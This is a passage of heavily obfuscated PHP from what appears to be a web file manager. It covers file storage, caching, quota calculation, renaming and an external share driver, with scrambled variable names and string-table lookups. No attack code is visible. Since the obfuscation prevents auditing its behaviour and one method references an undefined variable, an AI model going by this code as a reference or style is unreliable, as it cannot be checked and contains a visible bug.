$ªÆÓï®â[545], $ÚòÊ´ìÀ); } public function setContent($Û§ìºã, $²â‹íÅ¼ = '') { $ëÆÉŠªş =& $_SERVER[Ï×Œõ”û]; $ßà½¶ÌĞ = $this->sourceInfo($Û§ìºã); $­ŸÛ¶Îì = $this->fileInfoGet($Û§ìºã); if (!$­ŸÛ¶Îì || !$ßà½¶ÌĞ) { return !1; } $£“è“İú = KodIO::ioFileDriverGet($ëÆÉŠªş[503] . $Û§ìºã . $ëÆÉŠªş[404]); $ª²¿ò— = Model($ëÆÉŠªş[565])->addFileByContent($²â‹íÅ¼, $£“è“İú, $ßà½¶ÌĞ[$ëÆÉŠªş[32]]); if (!$ª²¿ò—) { return !1; } $à¥ë¢ğº = $this->fileHistory($ßà½¶ÌĞ, $ª²¿ò—[$ëÆÉŠªş[562]], $ª²¿ò—[$ëÆÉŠªş[79]]); if (!$à¥ë¢ğº) { return Model($ëÆÉŠªş[565])->remove($ª²¿ò—[$ëÆÉŠªş[562]]); } $this->folderSizeReset($ßà½¶ÌĞ[$ëÆÉŠªş[192]]); return !0; } public function fileSubstr($«ØÃò”, $²Ô¦×–, $Ä¦š¤©Ú) { $”×á”‹ù = $this->fileInfoGet($«ØÃò”); if (!$”×á”‹ù) { return !1; } return IO::fileSubstr($”×á”‹ù[$_SERVER[Ï×Œõ”û][87]], $²Ô¦×–, $Ä¦š¤©Ú); } public function fileInfoGet($àÇŞº‰) { $ûúÄ­Ìö =& $_SERVER[Ï×Œõ”û]; $íèÓ×ĞÉ = $this->sourceInfo($àÇŞº‰); if (!$íèÓ×ĞÉ || $íèÓ×ĞÉ[$ûúÄ­Ìö[505]]) { return !1; } $õıÜ»ú¡ = $ûúÄ­Ìö[569] . $íèÓ×ĞÉ[$ûúÄ­Ìö[562]]; $‹Œ€¡Œ = _get(self::$cacheFileInfo, $õıÜ»ú¡); if ($‹Œ€¡Œ) { return $‹Œ€¡Œ; } $µºŒ’± = Model($ûúÄ­Ìö[565])->fileInfo($íèÓ×ĞÉ[$ûúÄ­Ìö[562]]); if ($µºŒ’±) { $µºŒ’±[$ûúÄ­Ìö[32]] = $íèÓ×ĞÉ[$ûúÄ­Ìö[32]]; } self::$cacheFileInfo[$õıÜ»ú¡] = $µºŒ’±; return $µºŒ’±; } private function folderChildrenNumber($ÎºöäÉ) { $ÁêôÙİğ =& $_SERVER[Ï×Œõ”û]; $ª©‚‚Â = $this->sourceInfo($ÎºöäÉ); $¶Ğé¼Î’ = array($ÁêôÙİğ[680] => array($ÁêôÙİğ[640], $ª©‚‚Â[$ÁêôÙİğ[609]] . $ÎºöäÉ . $ÁêôÙİğ[641]), $ÁêôÙİğ[677] => $ª©‚‚Â[$ÁêôÙİğ[594]], $ÁêôÙİğ[524] => intval($ª©‚‚Â[$ÁêôÙİğ[525]]), $ÁêôÙİğ[674] => 1); $…Ãœ§ = $this->where($¶Ğé¼Î’)->count(); $ŒÙª¬ñæ = $this->where($¶Ğé¼Î’)->where(array($ÁêôÙİğ[674] => 0))->count(); return array($ÁêôÙİğ[83] => $ŒÙª¬ñæ, $ÁêôÙİğ[84] => $…Ãœ§); } public function pathInfo($÷ÒÜõœ­, $Ä±€‹² = false) { $ç‡î””÷ =& $_SERVER[Ï×Œõ”û]; $Ä±€‹² = !1; $÷ÒÜõœ­ = intval($÷ÒÜõœ­); if (!$÷ÒÜõœ­) { return !1; } $š®ÇÔşì = $ç‡î””÷[553] . intval($Ä±€‹²) . $ç‡î””÷[474] . $÷ÒÜõœ­; $¤Ñô´ = _get(self::$cachePathInfo, $š®ÇÔşì); if ($¤Ñô´) { return $¤Ñô´; } $Ò¤ÊÜ¸º = $this->sourceInfo($÷ÒÜõœ­); if (!$Ò¤ÊÜ¸º) { return !1; } $Ò¤ÊÜ¸º = $this->_listDataApplyItem($Ò¤ÊÜ¸º, $Ä±€‹²); self::$cachePathInfo[$š®ÇÔşì] = $Ò¤ÊÜ¸º; return $Ò¤ÊÜ¸º; } public static $cachePathInfoMore = array(); public function pathInfoMore($×Ö±¯±) { $Œ„ÜŠ÷ =& $_SERVER[Ï×Œõ”û]; $ë–™œ™ê = _get(self::$cachePathInfoMore, $×Ö±¯±); if ($ë–™œ™ê) { return $ë–™œ™ê; } $ÂİáªÃÁ = $this->pathInfo($×Ö±¯±); if (!$ÂİáªÃÁ) { return !1; } if ($ÂİáªÃÁ[$Œ„ÜŠ÷[505]] == $Œ„ÜŠ÷[91]) { $ÂİáªÃÁ[$Œ„ÜŠ÷[82]] = $this->folderChildrenNumber($×Ö±¯±); } self::$cachePathInfoMore[$×Ö±¯±] = $ÂİáªÃÁ; return $ÂİáªÃÁ; } public function sourceInfo($•ÀŞñãã) { $“Ëº‰ßŒ =& $_SERVER[Ï×Œõ”û]; if (!$•ÀŞñãã) { return array(); } $•ÀŞñãã = intval($•ÀŞñãã); $öÀ§‰¶‚ = $“Ëº‰ßŒ[552] . $•ÀŞñãã; $¨æ»ñÃÜ = _get(self::$cacheSourceInfo, $öÀ§‰¶‚); if ($¨æ»ñÃÜ) { return $¨æ»ñÃÜ; } $ĞäÙ¸™ = $this->where(array($“Ëº‰ßŒ[193] => $•ÀŞñãã))->find(); self::$cacheSourceInfo[$öÀ§‰¶‚] = $ĞäÙ¸™; return self::$cacheSourceInfo[$öÀ§‰¶‚]; } public function sourceCacheClear($„üÁ¬ŸÁ = false) { self::cacheClear($„üÁ¬ŸÁ); } public static function cacheClear($»™èÂÛÃ = false) { $æ‡È£ó =& $_SERVER[Ï×Œõ”û]; if ($»™èÂÛÃ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$æ‡È£ó[552] . $»™èÂÛÃ]); unset(self::$cachePathInfoMore[$»™èÂÛÃ]); unset(self::$cachePathInfo[$æ‡È£ó[2454] . $»™èÂÛÃ]); unset(self::$cachePathInfo[$æ‡È£ó[2455] . $»™èÂÛÃ]); } public function metaSet($¹Ëº…ş, $‹ø£¡Ø  = null, $¨ÌÎÁ† = null) { $’‚ÚÕ§† = parent::metaSet($¹Ëº…ş, $‹ø£¡Ø , $¨ÌÎÁ†); if ($’‚ÚÕ§†) { $this->sourceCacheClear($¹Ëº…ş); } return $’‚ÚÕ§†; } public function pathInfoByPath($˜º¢ğ–, $€ø®âŞ) { $âôĞãí =& $_SERVER[Ï×Œõ”û]; $óß’®¶ = !$€ø®âŞ ? array() : explode($âôĞãí[8], trim($€ø®âŞ, $âôĞãí[8])); $ó‹Œ²”è = intval($˜º¢ğ–); foreach ($óß’®¶ as $Âò°ùÜ„) { $¸ªï…ÏŞ = array($âôĞãí[192] => $ó‹Œ²”è, $âôĞãí[32] => $Âò°ùÜ„); $¤Ç×ˆ™ = $this->field($âôĞãí[2456])->where($¸ªï…ÏŞ)->select(); if (!$¤Ç×ˆ™) { return !1; } $¤Ç×ˆ™ = array_sort_by($¤Ç×ˆ™, $âôĞãí[525]); $ó‹Œ²”è = intval($¤Ç×ˆ™[0][$âôĞãí[193]]); } $Èİºš•Ï = $this->sourceInfo($ó‹Œ²”è); $this->pathInfoFilter($Èİºš•Ï); return $Èİºš•Ï; } protected function updateModifyTime($Ëü˜ª¢°) { $„€»úèë =& $_SERVER[Ï×Œõ”û]; $‰ µÓå‹ = KodUser::id(); if (!$Ëü˜ª¢°) { return; } if (!is_array($Ëü˜ª¢°)) { $Ëü˜ª¢° = array($Ëü˜ª¢°); } foreach ($Ëü˜ª¢° as $÷º®ÑÛÂ => $¼¨¨«ô) { $Ëü˜ª¢°[$÷º®ÑÛÂ] = intval($¼¨¨«ô); $this->sourceCacheClear($¼¨¨«ô); } $òùöşññ = array($„€»úèë[193] => array($„€»úèë[7], $Ëü˜ª¢°)); $°Ü“Ë = array($„€»úèë[679] => $‰ µÓå‹, $„€»úèë[518] => time()); $this->where($òùöşññ)->save($°Ü“Ë); } public function folderSizeReset($ö¢ıŠ³‘, $§ÎâÁÓ = false) { $ƒ²°‡Ø =& $_SERVER[Ï×Œõ”û]; if ($this->statusIgnoreResetSpace) { return; } if (!$ö¢ıŠ³‘) { return; } $õµÖ¦Û® = $this->sourceInfo($ö¢ıŠ³‘); $”Á€Áù· = $ƒ²°‡Ø[2457] . $ö¢ıŠ³‘; if (!$õµÖ¦Û® || !$õµÖ¦Û®[$ƒ²°‡Ø[193]]) { return; } CacheLock::lock($”Á€Áù·, 20); if ($§ÎâÁÓ === !1) { $this->sourceCacheClear($ö¢ıŠ³‘); $õµÖ¦Û® = $this->sourceInfo($ö¢ıŠ³‘); $ÆÂ§¶»à = array($ƒ²°‡Ø[497] => $ö¢ıŠ³‘, $ƒ²°‡Ø[524] => 0); $ºÂ„®ûÆ = $this->where($ÆÂ§¶»à)->sum($ƒ²°‡Ø[79]); $§ÎâÁÓ = intval($ºÂ„®ûÆ) - intval($õµÖ¦Û®[$ƒ²°‡Ø[79]]); } if ($§ÎâÁÓ == 0) { return CacheLock::unlock($”Á€Áù·); } $­ò˜ã—à = $this->parentLevelArray($õµÖ¦Û®[$ƒ²°‡Ø[609]]); if (!$­ò˜ã—à) { $­ò˜ã—à = array(); } $­ò˜ã—à[] = $õµÖ¦Û®[$ƒ²°‡Ø[193]]; $ÆÂ§¶»à = array($ƒ²°‡Ø[193] => array($ƒ²°‡Ø[512], $­ò˜ã—à)); if ($§ÎâÁÓ < 0) { $ÆÂ§¶»à[$ƒ²°‡Ø[79]] = array($ƒ²°‡Ø[1136], abs($§ÎâÁÓ)); } $this->where($ÆÂ§¶»à)->setAdd($ƒ²°‡Ø[79], $§ÎâÁÓ); CacheLock::unlock($”Á€Áù·); if (!$õµÖ¦Û®[$ƒ²°‡Ø[594]] || $õµÖ¦Û®[$ƒ²°‡Ø[594]] == $ƒ²°‡Ø[230]) { return; } $çÁıëÆ‰ = $ƒ²°‡Ø[2458] . $õµÖ¦Û®[$ƒ²°‡Ø[190]] . $ƒ²°‡Ø[4] . $õµÖ¦Û®[$ƒ²°‡Ø[594]]; $“„­ä’ = array($õµÖ¦Û®[$ƒ²°‡Ø[190]], $õµÖ¦Û®[$ƒ²°‡Ø[594]]); TaskRun::timeLimitCall($çÁıëÆ‰, $ƒ²°‡Ø[2459], $“„­ä’, 1.5); } public function folderSizeResetChildren($³¹šÔí¹) { $Êµ¥»øÎ =& $_SERVER[Ï×Œõ”û]; $this->sourceCacheClear($³¹šÔí¹); $§›ˆöá¨ = $this->sourceInfo($³¹šÔí¹); if (!$§›ˆöá¨) { return; } $¦»Üé„Õ = array($Êµ¥»øÎ[674] => 1, $Êµ¥»øÎ[677] => $§›ˆöá¨[$Êµ¥»øÎ[594]], $Êµ¥»øÎ[680] => array($Êµ¥»øÎ[640], $§›ˆöá¨[$Êµ¥»øÎ[609]] . $³¹šÔí¹ . $Êµ¥»øÎ[641])); $Æ–†›µÑ = $Êµ¥»øÎ[2460]; $Òº¯½Í¹ = $this->field($Æ–†›µÑ)->where($¦»Üé„Õ)->select(); $¦»Üé„Õ[$Êµ¥»øÎ[505]] = 0; $®ÖÖšç = $this->field($Æ–†›µÑ)->where($¦»Üé„Õ)->select(); if (!$®ÖÖšç) { return; } $Òº¯½Í¹[] = $§›ˆöá¨; $Òº¯½Í¹ = array_to_keyvalue($Òº¯½Í¹, $Êµ¥»øÎ[193]); foreach ($Òº¯½Í¹ as $¨›×€½ => $‹–¤À¨™) { $Òº¯½Í¹[$¨›×€½][$Êµ¥»øÎ[2461]] = $Òº¯½Í¹[$¨›×€½][$Êµ¥»øÎ[79]]; $Òº¯½Í¹[$¨›×€½][$Êµ¥»øÎ[79]] = 0; } foreach ($®ÖÖšç as $‹–¤À¨™) { $Í‡ëñÖ = $‹–¤À¨™[$Êµ¥»øÎ[192]] . $Êµ¥»øÎ[12]; if (!isset($Òº¯½Í¹[$Í‡ëñÖ])) { continue; } if ($‹–¤À¨™[$Êµ¥»øÎ[525]] == $Òº¯½Í¹[$Í‡ëñÖ][$Êµ¥»øÎ[525]]) { $Òº¯½Í¹[$Í‡ëñÖ][$Êµ¥»øÎ[79]] += $‹–¤À¨™[$Êµ¥»øÎ[79]]; } } foreach ($Òº¯½Í¹ as $‹–¤À¨™) { $ë¿œ†÷ = $this->parentLevelArray($‹–¤À¨™[$Êµ¥»øÎ[609]]); foreach ($ë¿œ†÷ as $Í‡ëñÖ) { $Í‡ëñÖ = $Í‡ëñÖ . $Êµ¥»øÎ[12]; if (!isset($Òº¯½Í¹[$Í‡ëñÖ])) { continue; } if ($‹–¤À¨™[$Êµ¥»øÎ[525]] == $Òº¯½Í¹[$Í‡ëñÖ][$Êµ¥»øÎ[525]]) { $Òº¯½Í¹[$Í‡ëñÖ][$Êµ¥»øÎ[79]] += $‹–¤À¨™[$Êµ¥»øÎ[79]]; } } } $­Ïƒ¨íğ = array(); foreach ($Òº¯½Í¹ as $‹–¤À¨™) { if ($‹–¤À¨™[$Êµ¥»øÎ[79]] == $‹–¤À¨™[$Êµ¥»øÎ[2461]]) { continue; } $­Ïƒ¨íğ[] = array($Êµ¥»øÎ[193], $‹–¤À¨™[$Êµ¥»øÎ[193]], $Êµ¥»øÎ[79], $‹–¤À¨™[$Êµ¥»øÎ[79]]); } $this->saveAll($­Ïƒ¨íğ); } public function userSpaceReset($êÓ¥Çé“ = false) { $éğ¢şŞ =& $_SERVER[Ï×Œõ”û]; $ßŠ¤œšÂ = $this->where(array($éğ¢şŞ[190] => self::TYPE_USER, $éğ¢şŞ[594] => $êÓ¥Çé“, $éğ¢şŞ[505] => 0))->sum($éğ¢şŞ[79]); $ßŠ¤œšÂ = !$ßŠ¤œšÂ || $ßŠ¤œšÂ <= 0 ? 0 : $ßŠ¤œšÂ; Model($éğ¢şŞ[602])->userEdit($êÓ¥Çé“, array($éğ¢şŞ[2126] => $ßŠ¤œšÂ)); } public function targetSpaceUpdate($¶©º«şé, $‚ÛÊ£Úş) { $½Êò‡»· =& $_SERVER[Ï×Œõ”û]; if (!$‚ÛÊ£Úş) { return; } if (!in_array($¶©º«şé, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $¾›—ˆ›ú = $this->targetSpaceSize($¶©º«şé, $‚ÛÊ£Úş); if ($¶©º«şé == self::TYPE_USER) { Model($½Êò‡»·[602])->userEdit($‚ÛÊ£Úş, array($½Êò‡»·[2126] => $¾›—ˆ›ú)); } else { if ($¶©º«şé == self::TYPE_GROUP) { Model($½Êò‡»·[610])->groupEdit($‚ÛÊ£Úş, array($½Êò‡»·[2126] => $¾›—ˆ›ú)); } } } public function targetSpaceSize($ È½¨Õ, $ì»ÃÑñ) { $š”‚†°° =& $_SERVER[Ï×Œõ”û]; $Ç¶Ìîø÷ = 0; $êéØ×º³ = $this->targetSourceRoot($ È½¨Õ, $ì»ÃÑñ, !0); foreach ($êéØ×º³ as $ÛŒ’ËùÍ) { if (!$ÛŒ’ËùÍ) { continue; } $Ç¶Ìîø÷ += floatval($ÛŒ’ËùÍ[$š”‚†°°[79]]); $«™ÃÒÖË = array($š”‚†°°[680] => array($š”‚†°°[640], $š”‚†°°[618] . $ÛŒ’ËùÍ[$š”‚†°°[193]] . $š”‚†°°[641])); $èİê¥®´ = Model($š”‚†°°[523])->field($š”‚†°°[511])->where($«™ÃÒÖË)->select(); $èİê¥®´ = array_to_keyvalue($èİê¥®´, $š”‚†°°[12], $š”‚†°°[193]); $èİê¥®´ = array_unique(array_filter($èİê¥®´)); if ($èİê¥®´) { $«™ÃÒÖË = array($š”‚†°°[511] => array($š”‚†°°[512], $èİê¥®´)); $Ç¶Ìîø÷ += floatval($this->where($«™ÃÒÖË)->sum($š”‚†°°[79])); } } $Ç¶Ìîø÷ = !$Ç¶Ìîø÷ || $Ç¶Ìîø÷ <= 0 ? 0 : $Ç¶Ìîø÷; return $Ç¶Ìîø÷; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Æ±Ò¿) { return $this->fileTypeProfile($Æ±Ò¿, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ç—‚é¯Â) { return $this->fileTypeProfile($ç—‚é¯Â, SourceModel::TYPE_GROUP); } private function fileTypeProfile($çê¹ÑÈ‚, $–âˆÀå˜) { $í«˜ó‡ =& $_SERVER[Ï×Œõ”û]; $ŸßÓë›… = $í«˜ó‡[2462] . $çê¹ÑÈ‚ . $í«˜ó‡[11] . $–âˆÀå˜; $ÚÛ…ì¿å = Cache::get($ŸßÓë›…); if ($ÚÛ…ì¿å) { return $ÚÛ…ì¿å; } $–©€İ• = array($í«˜ó‡[674] => 0); if ($çê¹ÑÈ‚ != !1) { $–©€İ•[$í«˜ó‡[594]] = $çê¹ÑÈ‚; $–©€İ•[$í«˜ó‡[190]] = $–âˆÀå˜; } $õµÄÜÅ = array(); $Îñ­ò = $this->field(array($í«˜ó‡[2388] => $í«˜ó‡[2093], $í«˜ó‡[2463] => $í«˜ó‡[79]))->where($–©€İ•)->find(); $õµÄÜÅ[$í«˜ó‡[2464]] = array($í«˜ó‡[2465] => LNG($í«˜ó‡[2464]), $í«˜ó‡[2466] => intval($Îñ­ò[$í«˜ó‡[2093]]), $í«˜ó‡[645] => intval($Îñ­ò[$í«˜ó‡[79]])); $Ã…ª‹Êê = KodIO::fileTypeList(); foreach ($Ã…ª‹Êê as $Æ¯ŸïÅ => $—ú¹µÂö) { $–©€İ•[$í«˜ó‡[506]] = $this->fileTypeWhere($Æ¯ŸïÅ); $Îñ­ò = $this->field(array($í«˜ó‡[2388] => $í«˜ó‡[2093], $í«˜ó‡[2463] => $í«˜ó‡[79]))->where($–©€İ•)->find(); $õµÄÜÅ[$Æ¯ŸïÅ] = array($í«˜ó‡[2465] => $—ú¹µÂö[$í«˜ó‡[32]], $í«˜ó‡[2466] => intval($Îñ­ò[$í«˜ó‡[2093]]), $í«˜ó‡[645] => intval($Îñ­ò[$í«˜ó‡[79]])); } Cache::set($ŸßÓë›…, $õµÄÜÅ, 1200); return $õµÄÜÅ; } public function fileNameExist($Ìİê£¦†, $èŠÌÎéè) { $ÄÅô«¯æ =& $_SERVER[Ï×Œõ”û]; $úÕ°¿‘… = $this->field($ÄÅô«¯æ[2467])->where(array($ÄÅô«¯æ[192] => $Ìİê£¦†, $ÄÅô«¯æ[32] => $èŠÌÎéè, $ÄÅô«¯æ[525] => 0))->find(); return is_array($úÕ°¿‘…) ? $úÕ°¿‘…[$ÄÅô«¯æ[193]] : !1; } public function childList($êØ¸Éå) { $áÛÆ–ş =& $_SERVER[Ï×Œõ”û]; $í Ûåî£ = $áÛÆ–ş[2439] . $êØ¸Éå; if (isset(self::$cacheChildList[$í Ûåî£])) { return self::$cacheChildList[$í Ûåî£]; } $ºìÂŠ–É = array($áÛÆ–ş[192] => intval($êØ¸Éå), $áÛÆ–ş[525] => 0); $Ì³‚½¶˜ = $this->where($ºìÂŠ–É)->select(); $Ì³‚½¶˜ = $Ì³‚½¶˜ ? $Ì³‚½¶˜ : array(); self::$cacheChildList[$í Ûåî£] = $Ì³‚½¶˜; foreach ($Ì³‚½¶˜ as $Ú˜ãÚ§İ) { $í Ûåî£ = $áÛÆ–ş[552] . $Ú˜ãÚ§İ[$áÛÆ–ş[193]]; self::$cacheSourceInfo[$í Ûåî£] = $Ú˜ãÚ§İ; } return $Ì³‚½¶˜; } public function fileNameAuto($çÊ‘Üğ, $°¿àá¡Å, $Óİıøë‘ = REPEAT_RENAME, $«—¬»”Ô = false) { $˜ùô¬¸ö =& $_SERVER[Ï×Œõ”û]; $½”®–Ö‡ = get_path_ext($°¿àá¡Å); $ñ¬ıûå° = $½”®–Ö‡ ? get_path_ext_name($°¿àá¡Å) . $˜ùô¬¸ö[2468] . $½”®–Ö‡ : $°¿àá¡Å . $˜ùô¬¸ö[472]; $İ—İ‹æ  = array($˜ùô¬¸ö[192] => $çÊ‘Üğ, $˜ùô¬¸ö[525] => 0, $˜ùô¬¸ö[32] => array($˜ùô¬¸ö[471], $ñ¬ıûå°)); $ÁœÎÂÈö = $this->field($˜ùô¬¸ö[32])->where($İ—İ‹æ )->select(); $Ê”£—ı× = array_to_keyvalue($ÁœÎÂÈö, $˜ùô¬¸ö[12], $˜ùô¬¸ö[32]); return $this->fileNameAutoGet($Ê”£—ı×, $°¿àá¡Å, $Óİıøë‘, $«—¬»”Ô); } public function fileNameAutoGet($ØŠ™Çïº, $şˆ¹‘İÅ, $ğ·ë–Ã, $±ùãŠ‘•) { $¾ì™áó =& $_SERVER[Ï×Œõ”û]; if ($ğ·ë–Ã == REPEAT_REPLACE || !$ØŠ™Çïº || !in_array_not_case($şˆ¹‘İÅ, $ØŠ™Çïº) || $±ùãŠ‘• && $ğ·ë–Ã != REPEAT_RENAME_FOLDER) { return $şˆ¹‘İÅ; } if ($ğ·ë–Ã == REPEAT_SKIP) { return !1; } $–¾ĞæÃ¾ = $¾ì™áó[10] . get_path_ext($şˆ¹‘İÅ); $–¾ĞæÃ¾ = $–¾ĞæÃ¾ == $¾ì™áó[10] || $±ùãŠ‘• ? $¾ì™áó[12] : $–¾ĞæÃ¾; for ($‘É¥†äÇ = 1; $‘É¥†äÇ <= count($ØŠ™Çïº) + 1; $‘É¥†äÇ++) { $¨èºæùĞ = substr($şˆ¹‘İÅ, 0, strlen($şˆ¹‘İÅ) - strlen($–¾ĞæÃ¾)); $©·¹¹ğ = $¨èºæùĞ . "\50{$‘É¥†äÇ}\x29{$–¾ĞæÃ¾}"; if (!in_array_not_case($©·¹¹ğ, $ØŠ™Çïº)) { return $©·¹¹ğ; } } } } goto CÊƒÈ’à¾; f´ÁÜŒ¿Ü: class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($ËŸ×ô•á) { $«üªæœ =& $_SERVER[Ï×Œõ”û]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $ËŸ×ô•á; $€áœ±ş¯ = Model($«üªæœ[692])->getInfo($ËŸ×ô•á[$«üªæœ[484]]); $‘É¨ÍÜç = _get($€áœ±ş¯, $«üªæœ[585]); $Šä¾ª¼… = Model($«üªæœ[592])->authMake(_get($€áœ±ş¯, $«üªæœ[1505])); if (!$€áœ±ş¯) { IO::errorTips(LNG($«üªæœ[1506]), !1); } if (!$Šä¾ª¼…) { IO::errorTips(LNG($«üªæœ[1507]), !1); } if ($‘É¨ÍÜç && is_string($‘É¨ÍÜç)) { $‘É¨ÍÜç = json_decode($‘É¨ÍÜç, !0); } if (!$‘É¨ÍÜç || !$Šä¾ª¼…) { return; } $this->_config = array($«üªæœ[1308] => rtrim($ËŸ×ô•á[$«üªæœ[1308]], $«üªæœ[8]) . $«üªæœ[8], $«üªæœ[1508] => $«üªæœ[1415] . $‘É¨ÍÜç[$«üªæœ[1509]] . $«üªæœ[504], $«üªæœ[581] => $€áœ±ş¯, $«üªæœ[585] => $‘É¨ÍÜç, $«üªæœ[1510] => $Šä¾ª¼…, $«üªæœ[1511] => substr(APP_HOST, 0, 8) == $«üªæœ[219], $«üªæœ[1512] => Model($«üªæœ[596])->authCheck($Šä¾ª¼…[$«üªæœ[508]], AuthModel::AUTH_VIEW, !1), $«üªæœ[1513] => Model($«üªæœ[596])->authCheck($Šä¾ª¼…[$«üªæœ[508]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($ åŸ’Á¡) { $ŞÏ©È‰ =& $_SERVER[Ï×Œõ”û]; $ª¸–¥ìÓ = $this->_config; if (!$ª¸–¥ìÓ) { return !1; } $ûÆ©€×¹ = array($ŞÏ©È‰[1514] => $ª¸–¥ìÓ[$ŞÏ©È‰[1512]], $ŞÏ©È‰[1515] => $ª¸–¥ìÓ[$ŞÏ©È‰[1512]], $ŞÏ©È‰[1336] => $ª¸–¥ìÓ[$ŞÏ©È‰[1512]], $ŞÏ©È‰[108] => $ª¸–¥ìÓ[$ŞÏ©È‰[1513]], $ŞÏ©È‰[1516] => $ª¸–¥ìÓ[$ŞÏ©È‰[1513]], $ŞÏ©È‰[1285] => $ª¸–¥ìÓ[$ŞÏ©È‰[1513]], $ŞÏ©È‰[1517] => !1, $ŞÏ©È‰[431] => !1, $ŞÏ©È‰[1518] => !1, $ŞÏ©È‰[1519] => !1); return $ûÆ©€×¹[$ åŸ’Á¡]; } public function listPath($ÁìŠò¸Ñ, $ò¡®Ïù÷ = false) { return $this->request($_SERVER[Ï×Œõ”û][1520], array($ÁìŠò¸Ñ)); } public function setContent($†Š¡¿ñĞ, $şˆÖ¸¾ = '') { return $this->request($_SERVER[Ï×Œõ”û][1521], array($†Š¡¿ñĞ, $şˆÖ¸¾)); } public function getContent($¼ßãª†‹) { return $this->_fileSubstr($¼ßãª†‹); } public function fileSubstr($ÎÉŸğËæ, $”İÙ³ç”, $ëÀ“ºÕ„) { return $this->_fileSubstr($ÎÉŸğËæ, $”İÙ³ç”, $ëÀ“ºÕ„); } public function download($§×µº©Ó, $­ââë“ë) { return $this->_download($§×µº©Ó, $­ââë“ë); } public function isFileOutServer() { return !1; } public function fileOut($ç÷ÖêåŒ, $ãõ™†Ï° = false, $øŸèä“— = false, $¡¯­³õ = '') { $ééşÜ§­ =& $_SERVER[Ï×Œõ”û]; $this->fileOutLink($this->_fileLink($ç÷ÖêåŒ, ($¡¯­³õ ? $ééşÜ§­[1522] . $¡¯­³õ : $ééşÜ§­[12]) . ($ãõ™†Ï° ? $ééşÜ§­[1523] : $ééşÜ§­[12]))); } public function fileOutImage($Î‚õå§õ, $ãçâ†³… = 250) { $this->fileOutLink($this->_fileLink($Î‚õå§õ, $_SERVER[Ï×Œõ”û][1524] . $ãçâ†³…)); } public function fileOutLink($‰½ƒ×öë) { header($_SERVER[Ï×Œõ”û][174] . $this->urlAuto($‰½ƒ×öë)); die; } public function exist($ˆ•Ë§Ôš) { $Ñßü€Ùœ = $this->_info($ˆ•Ë§Ôš); return $Ñßü€Ùœ ? !0 : !1; } public function isFile($úí‹›ƒ) { $ Ã›‹Ÿ† =& $_SERVER[Ï×Œõ”û]; $ñãå»¾ë = $this->_info($úí‹›ƒ); return _get($ñãå»¾ë, $ Ã›‹Ÿ†[33], $ Ã›‹Ÿ†[12]) == $ Ã›‹Ÿ†[232]; } public function isFolder($ŞÒÔÅ‚) { $„ú™Œ” =& $_SERVER[Ï×Œõ”û]; $…ÍÚ¸ = $this->_info($ŞÒÔÅ‚); return _get($…ÍÚ¸, $„ú™Œ”[33], $„ú™Œ”[12]) == $„ú™Œ”[78]; } public function size($ƒ”ç¼‹) { $ë¨ÍÚ÷ = $this->_info($ƒ”ç¼‹); return _get($ë¨ÍÚ÷, $_SERVER[Ï×Œõ”û][79], 0); } public function info($ûä½ØŠ‰) { return $this->_info($ûä½ØŠ‰); } public function infoAuth($ÑŞƒäø£) { return $this->_info($ÑŞƒäø£); } public function infoFull($…ıÀÈÄí) { return $this->_info($…ıÀÈÄí); } public function infoFullSimple($‡Ü¬ã÷Ç) { return $this->_info($‡Ü¬ã÷Ç); } public function infoWithChildren($àÏ¾Šö¿) { return $this->_info($àÏ¾Šö¿, !0); } public function has($¤÷±¢¯ú, $Šş¸ğ = false, $­‹ÊÕÚó = false) { $áìÑğòñ =& $_SERVER[Ï×Œõ”û]; $ŒäÄ§„É = $this->_info($¤÷±¢¯ú); if (!$ŒäÄ§„É) { return !1; } if ($Šş¸ğ) { return array($áìÑğòñ[241] => $ŒäÄ§„É[$áìÑğòñ[241]], $áìÑğòñ[242] => $ŒäÄ§„É[$áìÑğòñ[242]]); } return $İ¯ü¨ ? $ŒäÄ§„É[$áìÑğòñ[241]] > 0 : $ŒäÄ§„É[$áìÑğòñ[242]] > 0; } public function mkfile($Ç°ÜÈÌ, $åáôó½Ğ = '', $…¿ãâ = REPEAT_RENAME) { return $this->request($_SERVER[Ï×Œõ”û][1497], array($Ç°ÜÈÌ, $åáôó½Ğ, $…¿ãâ)); } public function mkdir($±ó ùÑ×, $ê¹ø»©¹ = REPEAT_SKIP) { return $this->request($_SERVER[Ï×Œõ”û][1498], array($±ó ùÑ×, $ê¹ø»©¹)); } public function remove($ß¥íöâĞ) { return $this->request($_SERVER[Ï×Œõ”û][1285], array($ß¥íöâĞ)); } public function rename($·öõÔÇÜ, $‡³ëãìœ) { return $this->request($_SERVER[Ï×Œõ”û][1501], array($·öõÔÇÜ, $‡³ëãìœ)); } public function moveSameAllow() { } public function copy($£ó…‘¯¤, $‚»òë—Á, $£ñµ¸™‹ = REPEAT_REPLACE, $Û–ÍİÎ² = false) { return $this->request($_SERVER[Ï×Œõ”û][646], array($£ó…‘¯¤, $‚»òë—Á, $£ñµ¸™‹)); } public function move($’Ñ°Í×, $–œıÜ¥õ, $•€ÄûÖş = REPEAT_REPLACE, $Ò±âåÛı = false) { return $this->request($_SERVER[Ï×Œõ”û][648], array($’Ñ°Í×, $–œıÜ¥õ, $•€ÄûÖş)); } public function uploadLink($ä‹ Ÿ‘¿, $ŒµÉº¥ş = 0) { $Î£°í÷ =& $_SERVER[Ï×Œõ”û]; $ÛÄş×İ· = IO::init($GLOBALS[$Î£°í÷[7]][$Î£°í÷[87]]); $Ç¶×£Ú = $this->pathApiEncode($ÛÄş×İ·->path); $ŞÖĞ¥ñÔ = $this->requestMakeUrl($Î£°í÷[1525], array($Î£°í÷[87] => $Ç¶×£Ú)); return array($Î£°í÷[1526] => $ŞÖĞ¥ñÔ); } public function upload($¦¿ìüß¬, $…ç®Ó’ı, $ò¾¹ó­– = false, $×³ç —î = REPEAT_REPLACE) { $„òéÖÙ¼ =& $_SERVER[Ï×Œõ”û]; if (filesize($…ç®Ó’ı) < $this->uploadChunkSize) { return $this->request($„òéÖÙ¼[108], 